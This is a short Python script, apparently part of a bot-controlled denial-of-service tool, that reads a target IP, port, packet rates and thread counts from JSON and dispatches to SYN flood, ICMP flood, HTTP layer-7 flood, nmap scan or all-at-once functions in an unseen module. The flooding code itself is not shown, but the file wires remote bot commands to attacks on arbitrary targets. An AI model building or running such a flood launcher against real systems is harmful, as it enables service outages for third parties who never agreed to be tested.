#!/usr/bin/env python3
"""Attack runner launched as subprocess by bot.py."""
import sys
import json
import main

args = json.loads(sys.argv[1])
attack = args["attack"]

main.TARGET_IP = args["target_ip"]
main.TARGET_PORT = args["target_port"]
main.TARGET_HTTP_HOST = args["http_host"]
main.SCAPY_PPS = args["scapy_pps"]
main.HTTP_THREADS = args["http_threads"]
main.HTTP_LOOPS_PER_THREAD = args["http_loops"]
main.HTTP_TIMEOUT = args["http_timeout"]
main.ICMP_PROCESSES = args["icmp_processes"]
main.NMAP_TIMEOUT = args["nmap_timeout"]

if attack == "nmap":
    main.run_nmap_scan()
elif attack == "http":
    main.run_http_layer7_test()
elif attack == "syn":
    main.run_scapy_syn_flood()
elif attack == "icmp":
    main.run_icmp_flood()
elif attack == "full":
    main.run_all_parallel()
